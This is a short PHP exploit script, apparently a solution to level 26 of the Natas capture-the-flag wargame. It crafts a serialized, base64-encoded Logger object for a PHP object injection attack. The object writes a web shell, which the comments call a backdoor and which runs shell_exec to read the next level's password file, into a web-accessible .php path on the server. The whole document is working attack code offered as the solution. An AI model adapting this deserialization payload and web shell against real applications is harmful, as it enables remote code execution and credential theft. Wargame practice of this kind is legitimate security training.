<?php

// Define a class named Logger
class Logger {
    // Declare two private properties: $logFile and $exitMsg
    private $logFile;
    private $exitMsg;

    // Constructor method gets called when a Logger object is instantiated
    function __construct() {
        // Set the message to be executed when the file is evaluated — this is a PHP backdoor
        // It will print the contents of the natas27 password file
        $this->exitMsg = "<?php echo shell_exec('cat /etc/natas_webpass/natas27'); ?>";

        // Set the log file path to a writable location in the web server directory
        // This path must be writable by the web app and accessible via HTTP later
        $this->logFile = "/var/www/natas/natas26/img/natas26_bjpjicte61qdhvvmpfr3tadc0o.php";
    }
}

// Create a new instance of the Logger class, which triggers the constructor and sets properties
$logger = new Logger();

// Serialize the object into a string representation (used for storing/transmitting PHP objects)
echo base64_encode(serialize($logger)); 
// This base64 encodes the serialized string so it can be safely sent over HTTP or stored in cookies